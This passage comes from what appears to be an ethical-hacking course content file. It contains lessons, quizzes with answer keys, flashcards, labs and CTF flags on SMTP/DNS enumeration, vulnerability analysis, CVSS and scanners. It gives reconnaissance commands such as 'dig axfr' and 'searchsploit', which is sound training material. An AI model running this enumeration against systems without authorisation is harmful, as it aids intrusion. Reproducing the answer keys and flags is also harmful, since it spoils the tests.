    {q:'If VRFY is disabled on a mail server, what sequence of SMTP commands can an attacker use to achieve the same result?',opts:['HELO followed by QUIT','MAIL FROM followed by RCPT TO','EXPN followed by DATA','AUTH LOGIN followed by USER'],correct:1,fb:'If VRFY is disabled, an attacker can start an email transaction (MAIL FROM) and then specify a recipient (RCPT TO). The server will often reject the RCPT TO command if the user does not exist, confirming the validity of the address.'},
    {q:'What does the SMTP EXPN command do?',opts:['Exports the mail server configuration','Expands a mailing list alias, returning the email addresses of all members on that list','Expires an email in the queue','Exploits a buffer overflow in the SMTP daemon'],correct:1,fb:'EXPN (Expand) is used to expand mailing list aliases (e.g., "sales-team"). If allowed, it provides the attacker with a bulk list of valid employee emails.'},
    {q:'Which tool is specifically designed to automate the testing of usernames against an SMTP server?',opts:['enum4linux','smtp-user-enum','snmpwalk','Nmap'],correct:1,fb:'smtp-user-enum is a perl script that automates the process of testing lists of usernames against an SMTP server using VRFY, EXPN, or RCPT TO methods.'},
    {q:'What is the primary risk of a misconfigured DNS Zone Transfer (AXFR)?',opts:['It allows attackers to send spoofed emails','It reveals the entire DNS database, exposing all subdomains, internal IP addresses, and hostnames to the attacker in a single query','It crashes the DNS server','It decrypts SSL/TLS certificates'],correct:1,fb:'A zone transfer copies the entire zone file. If left open to the public, it provides the attacker with a complete map of the organization\'s network infrastructure without requiring brute-force subdomain guessing.'},
    {q:'Which command-line tool is commonly used on Linux to attempt a DNS Zone Transfer?',opts:['nslookup','ping','dig (e.g., dig axfr @server domain.com)','traceroute'],correct:2,fb:'While nslookup can be used, `dig` is the standard and most powerful command-line tool for querying DNS records and requesting zone transfers (axfr) on Linux.'},
    {q:'What is DNS Cache Snooping?',opts:['Stealing passwords from the DNS cache','Querying a DNS server to see if a specific record is in its cache, revealing whether users on that network have recently visited a specific site','Corrupting the DNS cache to redirect traffic (Cache Poisoning)','Encrypting DNS queries'],correct:1,fb:'Cache snooping involves asking a DNS server (without recursion) for a domain. If it answers immediately, the record is in the cache, proving someone on that network recently visited that domain. This is used to profile target organizations.'},
    {q:'How should a secure organization configure DNS Zone Transfers?',opts:['Allow AXFR to all internal IP addresses','Disable DNS entirely','Restrict AXFR only to authorized secondary/slave DNS servers using IP whitelisting or TSIG keys','Allow AXFR only on port 53 UDP'],correct:2,fb:'Zone transfers are necessary for DNS redundancy, but they should be strictly limited to the specific IP addresses of the authorized secondary DNS servers that need to replicate the database.'},
    {q:'During an internal penetration test, you gain access to the network and find the Active Directory Domain Controller. Why is DNS enumeration highly relevant here?',opts:['Internal Active Directory relies on DNS; a zone transfer against the internal DC will often succeed and map the entire internal corporate network','Internal DNS servers are immune to zone transfers','DNS enumeration will crack the Domain Admin password','It allows you to bypass the perimeter firewall'],correct:0,fb:'Active Directory is heavily dependent on DNS. Internal DNS servers (often the Domain Controllers themselves) are frequently misconfigured to allow zone transfers to any internal IP, providing an instant map of all servers, workstations, and services on the internal network.'}
  ],
  flashcards:[
    {f:'SMTP (TCP 25)',b:'Simple Mail Transfer Protocol. Target for enumerating valid email addresses.'},
    {f:'SMTP VRFY',b:'SMTP command used to verify if a specific user exists on the server.'},
    {f:'SMTP EXPN',b:'SMTP command used to expand a mailing list alias into individual email addresses.'},
    {f:'SMTP RCPT TO',b:'Used to specify an email recipient. Attackers use it to verify users if VRFY is disabled.'},
    {f:'smtp-user-enum',b:'Command-line tool to automate the discovery of valid email addresses via SMTP.'},
    {f:'DNS AXFR',b:'Zone Transfer. A query that requests a full copy of the DNS database. Exposes entire network topologies if misconfigured.'},
    {f:'dig',b:'Linux command-line tool used for complex DNS queries, including attempting zone transfers (dig axfr @server domain).'},
    {f:'DNS Cache Snooping',b:'Querying a DNS server to check its cache, revealing if target users recently visited specific websites.'}
  ],
  ctf:{
    scenario:'You connect to an SMTP server manually via Netcat. You want to check if the user "admin" exists on the server. What four-letter command do you type?',
    hint:'It stands for Verify.',
    flag:'CEH{smtp_dns_3num3r4t10n}',
    points:150
  },
  summary:[
    'SMTP enumeration validates email addresses for use in spear-phishing or brute-force attacks.',
    'VRFY, EXPN, and RCPT TO are the three methods to extract this information from SMTP servers.',
    'Disable VRFY and EXPN on mail servers to prevent enumeration.',
    'DNS Zone Transfers (AXFR) are the holy grail of enumeration, exposing the entire domain infrastructure in one query.',
    'Use `dig axfr @nameserver target.com` to attempt a zone transfer.',
    'Always test zone transfers against ALL authoritative name servers, as secondary servers are often forgotten and misconfigured.',
    'Internal DNS servers (Active Directory) are prime targets for zone transfers during post-exploitation.'
  ]
};



// =================================================================
// MODULE 05 — Vulnerability Analysis
// =================================================================

CONTENT['vuln-concepts'] = {
  module:'Module 05 · Vulnerability Analysis',
  title:'Vulnerability Analysis Concepts',
  sub:'Identifying the weaknesses in the armor.',
  killchain:{phase:'Vulnerability Analysis',mitre:'TA0046 — Discovery',desc:'Once services are enumerated, attackers map them to known flaws. This phase transitions reconnaissance into actionable exploit selection.'},
  learn:{
    simple:'Vulnerability analysis is the process of discovering weaknesses in systems, applications, and networks that an attacker could exploit. It involves comparing the software versions found during enumeration against databases of known flaws.',
    analogy:'If scanning is finding an unlocked door, vulnerability analysis is noticing that the door lock is a model known to be easily picked with a standard paperclip, or that the hinges are mounted on the outside where they can be unscrewed.',
    why:'You cannot randomly throw exploits at a target and hope they work; that is noisy and often crashes the system (Denial of Service). Vulnerability analysis ensures you select the exact exploit designed for the specific flaw present on the target.',
    architecture:'Vulnerabilities generally fall into three categories: Design Flaws (inherently insecure protocols like Telnet), Implementation Flaws (coding errors like Buffer Overflows or SQL Injection), and Operational Flaws (misconfigurations like default passwords or open shares).'
  },
  diagram:{
    title:'The Vulnerability Lifecycle',
    steps:[
      {icon:'🔍',label:'1. Discovery',desc:'A researcher or attacker finds a new flaw in software.'},
      {icon:'⚠️',label:'2. Zero-Day Phase',desc:'The flaw is actively exploited in the wild before the vendor knows about it or has created a patch.'},
      {icon:'📣',label:'3. Disclosure & CVE',desc:'The flaw is publicly disclosed and assigned a CVE (Common Vulnerabilities and Exposures) tracking number.'},
      {icon:'💣',label:'4. Exploit Publishing',desc:'Proof-of-Concept (PoC) exploit code is published on Exploit-DB or added to Metasploit.'},
      {icon:'🛡️',label:'5. Patch Release',desc:'The vendor releases a security update fixing the flaw.'},
      {icon:'⏱️',label:'6. The Patch Gap',desc:'The critical window between when the patch is released and when organizations actually install it. This is when most breaches occur.'}
    ]
  },
  enterprise:{
    role:'You are the Vulnerability Management Lead at GlobalFinSec Corp.',
    situation:'Your automated weekly vulnerability scan completes and generates a 500-page PDF report detailing 12,000 "Critical" and "High" vulnerabilities across the enterprise.',
    challenge:'The IT patching team cannot patch 12,000 vulnerabilities this week. You must prioritize the findings based on true enterprise risk.',
    steps:[
      'Filter out False Positives: Verify if the scanner flagged a vulnerability based solely on the banner, even if a backported patch was applied.',
      'Contextualize Asset Value: Prioritize the 50 vulnerabilities affecting external-facing web servers and Domain Controllers over the 11,000 affecting isolated internal print servers.',
      'Check Exploitability: Prioritize vulnerabilities that have known, weaponized exploit code in Metasploit over theoretical vulnerabilities.',
      'Check Mitigating Controls: Lower the priority of a vulnerability if a Web Application Firewall (WAF) or IPS is already actively blocking the exploit signature.'
    ],
    outcome:'By applying context (asset value, exploitability, mitigating controls), you reduced the 12,000 "critical" findings to 14 "immediate action required" vulnerabilities. The IT team patched those 14 within 48 hours, significantly reducing actual enterprise risk without burning out the staff.',
    lesson:'Vulnerability scanning without contextual analysis is just noise. True vulnerability management is risk-based prioritization, not just running a tool and handing over a PDF.'
  },
  tools:[
    {name:'NVD (National Vulnerability Database)',cmd:'nvd.nist.gov',desc:'The US government repository of standards-based vulnerability management data'},
    {name:'Exploit-DB',cmd:'exploit-db.com',desc:'An archive of public exploits and corresponding vulnerable software'},
    {name:'SearchSploit',cmd:'searchsploit apache 2.4',desc:'Command-line search tool for Exploit-DB'}
  ],
  commands:{
    win:['Rem - Primarily browser-based research for manual analysis'],
    lin:['searchsploit vsftpd 2.3.4','nmap --script=vuln target']
  },
  pitfalls:[
    {icon:'⚠️',title:'Treating Vulnerability Scanning as Penetration Testing',desc:'Running Nessus and handing the client the automated PDF report is not a penetration test. It is a vulnerability assessment.',fix:'A penetration test involves exploiting those vulnerabilities to prove the risk and impact. Vulnerability scanning is just one phase of the assessment.'},
    {icon:'🔴',title:'Trusting Automated Scanners Blindly (False Positives)',desc:'Scanners often rely on banner grabbing. If an admin backported a patch (fixed the code but didn\'t update the version number), the scanner will falsely report the system as vulnerable.',fix:'Always manually verify critical vulnerabilities. If a scanner says a server is vulnerable to MS17-010, verify it manually or safely test the exploit.'},
    {icon:'⛔',title:'Ignoring "Low" or "Informational" Findings',desc:'Scanners might flag an open SMB share or a verbose error message as "Low" severity.',fix:'Attackers chain "Low" severity findings together. An informational finding (verbose error leaking a path) combined with a low finding (open share) can lead to a critical compromise.'}
  ],
  lab:{
    title:'Lab: Manual Vulnerability Research',
    difficulty:'Beginner',
    duration:'20 min',
    objectives:['Map a discovered service to a known exploit','Use SearchSploit','Understand Exploit-DB'],
    steps:[
      'Assume your Nmap scan from Module 3 discovered "vsftpd 2.3.4" running on port 21.',
      'Open a terminal and run: searchsploit vsftpd 2.3.4',
      'Note the exploit name (Backdoor Command Execution) and the path to the exploit script.',
      'Open a web browser and go to www.exploit-db.com.',
      'Search for "vsftpd 2.3.4". Read the exploit code (usually Ruby or Python) to see how it works.',
      'Search the National Vulnerability Database (NVD) for CVE-2011-2523 to read the official description of this flaw.'
    ],
    validation:'You should understand the workflow of taking a service version (from Nmap), searching for it in an exploit database, and finding the specific CVE and exploit code.'
  },
  quiz:[
    {q:'What is the primary difference between a Vulnerability Assessment and a Penetration Test?',opts:['A Vulnerability Assessment is illegal; a Penetration Test is authorized','A Vulnerability Assessment identifies and reports potential flaws; a Penetration Test actively exploits those flaws to prove the risk','A Penetration Test is automated; a Vulnerability Assessment is manual','There is no difference; the terms are synonymous'],correct:1,fb:'Vulnerability assessments stop at discovery and reporting. Penetration tests go a step further by actively exploiting the vulnerabilities (weaponization) to demonstrate actual impact.'},
    {q:'What is a "Zero-Day" vulnerability?',opts:['A vulnerability that has zero impact on the system','A flaw that has been patched for zero days','A vulnerability that is known to the vendor but has not yet been patched, or is actively being exploited before the vendor is even aware of it','A vulnerability that takes zero days to exploit'],correct:2,fb:'A zero-day means the vendor has had "zero days" to fix the issue. There is no patch available, making it highly dangerous.'},
    {q:'Which of the following is an example of a "Design Flaw" vulnerability?',opts:['A buffer overflow in a C program','A web application vulnerable to SQL Injection','An administrator leaving the default password on a router','The use of the Telnet protocol, which transmits all data in plaintext by default'],correct:3,fb:'Telnet is functioning exactly as it was designed to. The flaw is in the fundamental design of the protocol (lack of encryption), not an error in the code (implementation) or a misconfiguration (operational).'},
    {q:'What is a "False Positive" in the context of vulnerability scanning?',opts:['When a scanner fails to find a vulnerability that actually exists','When a scanner reports a vulnerability that does not actually exist on the target system','When an exploit fails to work','When a system is secure'],correct:1,fb:'A false positive occurs when the scanner incorrectly flags a secure system as vulnerable. This often happens if the scanner relies solely on checking version banners and misses that a patch was backported.'},
    {q:'Why do attackers rely on resources like Exploit-DB?',opts:['To download viruses and malware to infect their own machines','To find pre-written Proof-of-Concept (PoC) exploit code for specific software versions discovered during enumeration','To scan targets automatically','To generate phishing emails'],correct:1,fb:'Exploit-DB is an archive of public exploits. Instead of writing custom exploit code from scratch for every vulnerability, attackers search Exploit-DB for existing code matching the target\'s software version.'},
    {q:'Which command-line tool allows you to search a local copy of the Exploit-DB archive?',opts:['Nmap','Metasploit','SearchSploit','Wireshark'],correct:2,fb:'SearchSploit is a command-line search utility for Exploit-DB that allows you to take an offline copy of the database and search it quickly on your Kali machine.'},
    {q:'What is the "Patch Gap"?',opts:['The time it takes to download a patch','The space on a hard drive reserved for updates','The critical window of time between when a vendor releases a patch and when an organization actually installs it','A vulnerability in a patch management system'],correct:2,fb:'The Patch Gap is when most systems are compromised. Once a patch is released, attackers reverse-engineer it to figure out what the flaw was, write an exploit, and attack organizations that haven\'t installed the patch yet.'},
    {q:'If a vulnerability scanner identifies 10,000 vulnerabilities, how should an enterprise prioritize remediation?',opts:['Patch all "Low" vulnerabilities first because they are easiest','Patch them in alphabetical order','Prioritize based on Asset Value (external vs internal), Exploitability (is there a known exploit?), and Mitigating Controls','Run the scanner again until the number goes down'],correct:2,fb:'True vulnerability management is risk-based. A "Critical" vulnerability on an internal print server is less risk to the enterprise than a "High" vulnerability on the public-facing e-commerce database.'},
    {q:'What type of vulnerability is caused by an administrator failing to change the factory default credentials on an IoT device?',opts:['Design Flaw','Implementation Flaw','Operational Flaw (Misconfiguration)','Zero-Day'],correct:2,fb:'The software code isn\'t broken (Implementation), and the protocol isn\'t flawed (Design). The error was made by the human operator failing to configure it securely.'},
    {q:'How do vulnerability scanners primarily identify flaws without crashing the system?',opts:['By running exploits against every port','By comparing the service banners and versions found against a database of known vulnerable versions','By deleting files and seeing if the system recovers','By asking the administrator for a list of vulnerabilities'],correct:1,fb:'Most automated scanners are non-intrusive. They grab banners, extract configuration details, and compare that data against a massive database of signatures to infer if a vulnerability exists.'}
  ],
  flashcards:[
    {f:'Vulnerability Assessment',b:'Identifying, quantifying, and ranking vulnerabilities. Does not involve active exploitation.'},
    {f:'Penetration Test',b:'Actively exploiting vulnerabilities to prove risk and demonstrate impact.'},
    {f:'Zero-Day',b:'A vulnerability actively exploited in the wild before a patch exists or before the vendor is aware.'},
    {f:'False Positive',b:'A scanner incorrectly reporting that a vulnerability exists when the system is actually secure.'},
    {f:'Exploit-DB',b:'A public archive of exploits and vulnerable software. Used to find pre-written PoC code.'},
    {f:'SearchSploit',b:'Command-line tool to search a local copy of Exploit-DB.'},
    {f:'Patch Gap',b:'The time between a patch being released and an organization installing it. The window of highest risk.'},
    {f:'Operational Flaw',b:'A vulnerability caused by misconfiguration, such as leaving default passwords or open shares.'}
  ],
  ctf:{
    scenario:'You discover a server running "vsftpd 2.3.4". You want to find an exploit for it quickly using the command line on your Kali Linux machine. What tool do you use to search your local copy of Exploit-DB?',
    hint:'It is a combination of the words Search and Exploit.',
    flag:'CEH{vuln_4ss3ssm3nt_c0r3}',
    points:150
  },
  summary:[
    'Vulnerability Analysis maps enumerated services to known flaws.',
    'It is distinct from Penetration Testing (which requires exploitation).',
    'Zero-days have no patch; the Patch Gap is the window when most exploits occur.',
    'SearchSploit and Exploit-DB are the primary resources for finding weaponized code.',
    'Scanners generate False Positives (especially with backported patches).',
    'Enterprise vulnerability management requires prioritizing patches based on business risk and asset context, not just CVSS scores.'
  ]
};

CONTENT['cve-cvss'] = {
  module:'Module 05 · Vulnerability Analysis',
  title:'CVE & CVSS Scoring',
  sub:'The universal language of vulnerabilities.',
  killchain:{phase:'Vulnerability Analysis',mitre:'TA0046 — Discovery',desc:'Understanding CVE and CVSS allows attackers to quickly identify the most devastating flaws and defenders to prioritize their patching efforts.'},
  learn:{
    simple:'CVE (Common Vulnerabilities and Exposures) is a dictionary of publicly known security vulnerabilities, giving each one a unique ID (e.g., CVE-2017-0144). CVSS (Common Vulnerability Scoring System) is the formula used to score the severity of that vulnerability from 0.0 to 10.0.',
    analogy:'CVE is like a catalog of car parts, where every defective brake pad gets a specific part number so mechanics worldwide know exactly what is broken. CVSS is the safety rating (from 1 to 10) telling the mechanic whether the car is safe to drive (1) or will explode immediately (10).',
    why:'Before CVE, every security vendor called vulnerabilities by different names, making communication impossible. The CVE system provides a standard identifier. The CVSS score removes subjective opinions ("I think this is bad") and replaces it with an objective metric based on how the vulnerability is exploited and its impact.',
    architecture:'A CVSS v3/v4 score is calculated from Base Metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction) and Impact Metrics (Confidentiality, Integrity, Availability). A CVSS 10.0 is the worst-case scenario: Network exploitable, low complexity, no privileges required, total system compromise.'
  },
  diagram:{
    title:'Deconstructing a CVSS Score (e.g., Log4Shell CVE-2021-44228)',
    steps:[
      {icon:'🌐',label:'Attack Vector (AV)',desc:'Network (N) vs Local (L) vs Physical (P). Log4Shell is Network (N), meaning it can be exploited remotely over the internet.'},
      {icon:'🧩',label:'Attack Complexity (AC)',desc:'Low (L) vs High (H). Log4Shell is Low (L), meaning it does not require complex conditions or timing to exploit.'},
      {icon:'🔑',label:'Privileges Required (PR)',desc:'None (N) vs Low (L) vs High (H). Log4Shell is None (N), meaning an unauthenticated attacker can trigger it.'},
      {icon:'👤',label:'User Interaction (UI)',desc:'None (N) vs Required (R). Log4Shell is None (N), meaning no one has to click a link for it to work.'},
      {icon:'💥',label:'Impact: C/I/A',desc:'Confidentiality, Integrity, Availability. Log4Shell is High (H) for all three, resulting in total system compromise.'},
      {icon:'📊',label:'Final Score',desc:'Because it is Network, Low Complexity, No Privs, No Interaction, and High Impact across the board, it scores a 10.0 (Critical).'}
    ]
  },
  enterprise:{
    role:'You are the CISO of GlobalFinSec Corp.',
    situation:'Your vulnerability scanner reports two vulnerabilities on an internal database server. Vuln A has a CVSS Base Score of 9.8. Vuln B has a CVSS Base Score of 7.5.',
    challenge:'Determine which vulnerability to patch first, knowing that you can adjust the CVSS Base Score with Environmental Metrics.',
    steps:[
      'Analyze Vuln A (CVSS 9.8): It is an RCE (Remote Code Execution) vulnerability. However, it requires the attacker to be on the local subnet (Attack Vector: Adjacent).',
      'Analyze Vuln B (CVSS 7.5): It is a Privilege Escalation vulnerability. It requires local access (Attack Vector: Local) but allows a low-privilege user to become Domain Admin.',
      'Apply Environmental Context: The database server is highly isolated. No regular users are on its subnet. Therefore, Vuln A (Adjacent) is very difficult to reach.',
      'However, GlobalFinSec relies heavily on contractors who have low-level access to the database server. Vuln B (Privilege Escalation) is highly likely to be exploited by an insider.'
    ],
    outcome:'You used the CVSS Environmental Metrics to lower the score of Vuln A (due to network isolation) and raise the priority of Vuln B (due to business context). You patched Vuln B first, preventing an insider threat from achieving Domain Admin.',
    lesson:'The CVSS Base Score (what you see in the news) assumes the worst-case scenario. True enterprise security requires adjusting the Base Score with Temporal (is there an exploit available?) and Environmental (is the system isolated?) metrics.'
  },
  tools:[
    {name:'NVD (National Vulnerability Database)',cmd:'nvd.nist.gov',desc:'Searchable database of all CVEs and their CVSS scores'},
    {name:'CVSS Calculator',cmd:'www.first.org/cvss/calculator',desc:'Web tool to calculate custom CVSS scores based on environmental factors'}
  ],
  commands:{
    win:['Rem - Conceptual framework, no specific command-line tools'],
    lin:['Rem - Conceptual framework, no specific command-line tools']
  },
  pitfalls:[
    {icon:'⚠️',title:'Treating CVSS as a Risk Score',desc:'CVSS measures Severity, not Risk. A CVSS 10.0 vulnerability on a disconnected, powered-off laptop in a safe has high severity but zero business risk.',fix:'Risk = Threat x Vulnerability x Impact. Use CVSS to understand the vulnerability, but use business context to determine the actual risk.'},
    {icon:'🔴',title:'Ignoring Temporal Metrics',desc:'A vulnerability might score a 9.0 when discovered. But if no exploit code is ever written, the actual threat is lower.',fix:'Use CVSS Temporal metrics to adjust the score based on Exploit Code Maturity. If a weaponized Metasploit module exists, the priority increases.'},
    {icon:'⛔',title:'Panicking over "Critical" Scores without Checking the Attack Vector',desc:'The media panics over every 9.0+ CVSS score. However, if the Attack Vector is "Physical" (requires the attacker to plug a USB drive into the server), the threat to a cloud environment is zero.',fix:'Always read the CVSS string (e.g., CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). The "AV" (Attack Vector) tells you how close the attacker needs to be.'}
  ],
  lab:{
    title:'Lab: Decoding a CVSS String',
    difficulty:'Beginner',
    duration:'15 min',
    objectives:['Understand the CVSS v3.1 vector string','Calculate a score using FIRST.org'],
    steps:[
      'Open a web browser and navigate to the FIRST.org CVSS v3.1 Calculator (first.org/cvss/calculator/3.1).',
      'Input the following string manually by clicking the buttons: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      'This represents Cross-Site Scripting (XSS). Notice the Attack Vector (Network), Privileges Required (None), User Interaction (Required - someone must click a link).',
      'Observe the final Base Score (6.1 - Medium).',
      'Change the Attack Vector to "Local" and observe how the score drops.',
      'Change the Impact (C/I/A) to "High" and observe how the score rises.'
    ],
    validation:'You should understand how changing individual variables (like whether user interaction is required) dramatically alters the final severity score of a vulnerability.'
  },
  quiz:[
    {q:'What does CVE stand for?',opts:['Critical Vulnerability Evaluation','Common Vulnerabilities and Exposures','Computer Virus Execution','Central Vulnerability Engine'],correct:1,fb:'CVE stands for Common Vulnerabilities and Exposures. It is a dictionary that provides a standardized identifier for publicly known vulnerabilities.'},
    {q:'What is the primary purpose of the CVSS (Common Vulnerability Scoring System)?',opts:['To assign a standardized name to a vulnerability','To provide an objective, numerical score reflecting the severity of a vulnerability','To automatically patch systems','To generate exploit code'],correct:1,fb:'While CVE provides the name, CVSS provides the score (0.0 to 10.0), allowing organizations to objectively assess severity and prioritize patching.'},
    {q:'In a CVSS v3.1 score, what does an Attack Vector (AV) of "Network" mean?',opts:['The vulnerability can be exploited remotely over the internet or a wide area network','The attacker must be on the same local subnet (e.g., connected to the same switch)','The attacker must have physical access to the machine','The vulnerability only affects network switches'],correct:0,fb:'An Attack Vector of Network (N) is the most dangerous, as the attacker can launch the exploit from anywhere in the world.'},
    {q:'Which of the following scenarios describes a CVSS "User Interaction" requirement of "None"?',opts:['An attacker sends a phishing email and the victim clicks a link','An attacker sends a malformed packet to a web server, which crashes immediately without any user action','An administrator must log in for the payload to execute','A user must download and run a malicious PDF'],correct:1,fb:'"None" means the vulnerability can be exploited solely by the attacker\'s actions, requiring no participation or mistakes from a victim user. These are highly prized by attackers for automated worms.'},
    {q:'What are the three components of the CVSS Impact Metric?',opts:['Attack Vector, Complexity, Privileges','Confidentiality, Integrity, Availability (The CIA Triad)','Exploitability, Remediation, Report Confidence','Scope, User Interaction, Timing'],correct:1,fb:'The impact of a vulnerability is measured by how much it compromises the CIA Triad. A remote code execution (RCE) flaw usually scores High in all three.'},
    {q:'If a vulnerability requires an attacker to already possess a valid user account on the system to exploit it, which CVSS metric is affected?',opts:['Attack Vector','User Interaction','Privileges Required','Scope'],correct:2,fb:'The Privileges Required (PR) metric determines if the attacker needs Low (standard user) or High (administrator) privileges before launching the exploit. "None" means unauthenticated attackers can use it.'},
    {q:'What is the highest possible CVSS Base Score?',opts:['5.0','10.0','100.0','It is infinite'],correct:1,fb:'The CVSS scale runs from 0.0 (None) to 10.0 (Critical). A 10.0 typically represents a remotely exploitable, unauthenticated vulnerability resulting in total system compromise.'},
    {q:'Why might a CISO adjust a CVSS Base Score using Environmental Metrics?',opts:['Because the Base Score is always wrong','To account for the specific security controls (like firewalls or isolation) deployed in their specific organization that might mitigate the vulnerability','To hide vulnerabilities from auditors','To increase the CVSS score to get more budget'],correct:1,fb:'The Base Score assumes the worst-case scenario. Environmental Metrics allow an organization to lower the score if they have compensating controls (e.g., the vulnerable system is air-gapped).'},
    {q:'What does the CVSS Temporal Metric "Exploit Code Maturity" assess?',opts:['How old the vulnerability is','Whether reliable, weaponized exploit code is publicly available (e.g., in Metasploit) or if it is just a theoretical concept','The age of the attacker','How long the system has been unpatched'],correct:1,fb:'A vulnerability might have a high Base Score, but if no one has figured out how to write a working exploit for it (Exploit Code Maturity is Unproven), the immediate threat is lower.'},
    {q:'A vulnerability scanner reports a CVSS 9.8 vulnerability. You investigate and find the Attack Vector is "Physical". What does this mean for a cloud-hosted web server?',opts:['It is in immediate danger of a remote attack','It must be patched within 1 hour','The vulnerability poses almost zero risk, because an attacker cannot physically touch a cloud server in an AWS data center','The cloud provider is breached'],correct:2,fb:'Physical Attack Vectors require inserting a USB drive or typing on the local keyboard. For a cloud server, this is impossible, demonstrating why you must read the CVSS vector string, not just the number.'}
  ],
  flashcards:[
    {f:'CVE',b:'Common Vulnerabilities and Exposures. A standardized dictionary providing a unique ID for known vulnerabilities.'},
    {f:'CVSS',b:'Common Vulnerability Scoring System. A numerical score (0.0 to 10.0) reflecting the severity of a vulnerability.'},
    {f:'Attack Vector (AV)',b:'CVSS metric. Determines how close the attacker needs to be: Network (N), Adjacent (A), Local (L), Physical (P).'},
    {f:'Privileges Required (PR)',b:'CVSS metric. Determines if the attacker needs authentication: None (N), Low (L), High (H).'},
    {f:'User Interaction (UI)',b:'CVSS metric. Determines if a victim must click a link or open a file (Required) or if it can be automated (None).'},
    {f:'CVSS Impact Metrics',b:'Measures the effect on Confidentiality, Integrity, and Availability (CIA Triad).'},
    {f:'CVSS Environmental Metrics',b:'Used by defenders to adjust the Base Score based on their specific network architecture and mitigating controls.'},
    {f:'CVSS Temporal Metrics',b:'Adjusts the score based on factors that change over time, primarily the availability of weaponized exploit code.'}
  ],
  ctf:{
    scenario:'You are analyzing a vulnerability with the vector string: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. Based on the PR metric (PR:N), does the attacker need to log in to exploit this?',
    hint:'PR stands for Privileges Required. N stands for None.',
    flag:'CEH{cv3_cvss_nvd_2026}',
    points:150
  },
  summary:[
    'CVE provides the Name (Identity). CVSS provides the Number (Severity).',
    'CVSS is scored from 0.0 to 10.0 (Critical).',
    'The CVSS Base Score assumes a worst-case scenario without any defensive controls.',
    'Attack Vector (Network) + Privileges (None) + User Interaction (None) creates the most dangerous vulnerabilities (Worms).',
    'Defenders must use Environmental and Temporal metrics to translate CVSS Severity into actual business Risk.',
    'Always read the Vector String (AV:N/AC:L...), never just the final number.'
  ]
};

CONTENT['nessus-openvas'] = {
  module:'Module 05 · Vulnerability Analysis',
  title:'Automated Vulnerability Scanners',
  sub:'Deploying Nessus and OpenVAS at scale.',
  killchain:{phase:'Vulnerability Analysis',mitre:'T1595.002 — Active Scanning: Vulnerability Scanning',desc:'Automated scanners drastically reduce the time required to map thousands of services to known CVEs across massive enterprise networks.'},
  learn:{
    simple:'Automated vulnerability scanners (like Nessus, OpenVAS, and Qualys) are software tools that scan networks, discover live hosts and open ports, and then query those ports with thousands of specific probes to identify known vulnerabilities (CVEs) and misconfigurations.',
    analogy:'If Nmap is walking down a hallway checking which doors are unlocked, Nessus is a robot walking down the hallway with a ring of 100,000 specific keys, trying every single key in every single unlocked door, and writing a report on which keys worked.',
    why:'Manual vulnerability research (taking an Nmap version and searching Exploit-DB) is required for targeted penetration testing, but it does not scale. To secure an enterprise with 5,000 servers, you must use automated scanners to identify the baseline vulnerabilities quickly.',
    architecture:'Scanners use "Plugins" or "Signatures" (small scripts). When a scan runs, the engine matches discovered services (e.g., Apache) with all plugins related to Apache. It sends the probe, analyzes the response against the signature, and flags a vulnerability if it matches.'
  },
  diagram:{
    title:'How Vulnerability Scanners Work',
    steps:[
      {icon:'📡',label:'1. Ping Sweep',desc:'Scanner identifies live hosts on the target network.'},
      {icon:'🔓',label:'2. Port Scan',desc:'Scanner identifies open TCP and UDP ports on live hosts.'},
      {icon:'📄',label:'3. Service Enumeration',desc:'Scanner grabs banners to identify the software and OS running.'},
      {icon:'🧩',label:'4. Plugin Selection',desc:'Scanner selects relevant vulnerability signatures (e.g., skips IIS plugins if the server is Apache).'},
      {icon:'💣',label:'5. Vulnerability Probing',desc:'Scanner sends specific, safe probes to verify if the vulnerability exists (without actually exploiting it).'},
      {icon:'📊',label:'6. Reporting',desc:'Scanner generates a report grouping vulnerabilities by severity (Critical, High, Medium, Low) and providing CVSS scores.'}
    ]
  },
  enterprise:{
    role:'You are a Vulnerability Management Engineer at GlobalFinSec Corp.',
    situation:'You run a weekly unauthenticated Nessus scan across the server subnet. It consistently reports 50 "Medium" vulnerabilities related to outdated software versions, but no "Critical" vulnerabilities.',
    challenge:'The CISO believes the network is secure. You know unauthenticated scans provide a false sense of security. You must prove the value of Authenticated (Credentialed) scanning.',
    steps:[
      'Run the baseline: Execute the standard unauthenticated Nessus scan on a test server.',
      'Configure Credentials: Create a dedicated service account with local administrator rights on the test server.',
      'Configure Nessus: Add the service account credentials to the Nessus scan policy (Credentialed Scan).',
      'Run Credentialed Scan: Execute the scan again.',
      'Compare Results: The unauthenticated scan found 5 vulnerabilities (mostly web server banners). The authenticated scan found 142 vulnerabilities, including 3 Criticals (missing Windows KBs, outdated local Adobe Reader, and an insecure local privilege escalation flaw).'
    ],
    outcome:'You presented the comparison to the CISO. Unauthenticated scans only see the outside of the server (the ports). Authenticated scans log into the server, read the registry, check installed software, and read configuration files. The CISO mandated authenticated scanning across the enterprise.',
    lesson:'Unauthenticated vulnerability scanning is only good for finding perimeter flaws. To truly understand enterprise risk, you must perform Authenticated (Credentialed) scanning.'
  },
  tools:[
    {name:'Nessus',cmd:'(Web GUI)',desc:'The industry standard commercial vulnerability scanner (Tenable)'},
    {name:'OpenVAS (Greenbone)',cmd:'(Web GUI)',desc:'The most popular open-source, full-featured vulnerability scanner'},
    {name:'Qualys',cmd:'(Cloud GUI)',desc:'Enterprise cloud-based vulnerability management platform'},
    {name:'Nexpose / InsightVM',cmd:'(Web GUI)',desc:'Rapid7\'s enterprise vulnerability scanner'}
  ],
  commands:{
    win:['Rem - Scanners are operated via Web GUI, not command line'],
    lin:['Rem - OpenVAS/Nessus services are started via systemctl, operated via browser']
  },
  pitfalls:[
    {icon:'⚠️',title:'Relying on Unauthenticated Scans',desc:'Unauthenticated scans only see what an external attacker sees. They miss 90% of internal vulnerabilities (missing OS patches, outdated local software, insecure permissions).',fix:'Always configure Authenticated (Credentialed) scans using SSH keys (Linux) or SMB credentials (Windows) for accurate enterprise vulnerability management.'},
    {icon:'🔴',title:'Scanning Fragile Systems with Default Policies',desc:'Running a default Nessus "Full Scan" against legacy mainframes, IoT devices, or SCADA equipment will almost certainly crash them due to the aggressive probing.',fix:'Create custom, lightweight scan policies for fragile systems. Disable aggressive plugins (like brute-forcing or DoS checks) and slow down the scan timing.'},
